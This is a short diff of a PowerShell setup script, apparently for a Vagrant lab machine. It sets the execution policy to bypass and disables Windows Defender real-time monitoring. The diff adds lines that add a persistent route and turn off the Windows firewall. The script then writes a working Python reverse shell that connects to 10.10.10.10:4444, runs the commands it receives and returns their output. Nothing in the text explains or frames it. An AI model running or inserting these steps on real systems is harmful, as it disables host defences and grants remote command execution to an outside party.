@@ -1,6 +1,9 @@
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+cmd /c "route add 10.10.10.0 mask 255.255.255.0 10.10.1.1 -p"
+netsh advfirewall set allprofiles state off
+
 mkdir C:\Users\vagrant\lab
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", "import socket, subprocess`n`ns = socket.socket()`ns.connect(('10.10.10.10', 4444))`nwhile True:`n    cmd = s.recv(1024).decode().strip()`n    if not cmd:`n        break`n    output = subprocess.run(cmd, shell=True, capture_output=True)`n    s.send(output.stdout + output.stderr)`n")
 
